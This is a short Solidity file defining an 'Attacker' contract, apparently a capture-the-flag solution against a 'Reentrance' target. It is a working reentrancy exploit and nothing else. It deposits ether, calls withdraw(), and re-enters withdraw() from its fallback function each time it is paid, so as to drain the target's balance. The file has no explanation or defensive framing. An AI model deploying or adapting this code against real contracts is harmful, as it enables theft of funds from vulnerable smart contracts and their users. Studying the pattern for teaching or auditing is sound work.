// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "./Reentrance.sol";

contract Attacker {
    Reentrance target;
    uint256 amount;
    uint256 attackAmount;

    constructor(address payable _targetContractAddress) public payable {
        target = Reentrance(_targetContractAddress);
        amount = address(target).balance;
        attackAmount = amount + 10;
    }

    function attack() public payable {
        target.donate{value: attackAmount}(address(this));
        target.withdraw(amount);
    }

    fallback() external payable {
        target.withdraw(amount);
    }
}
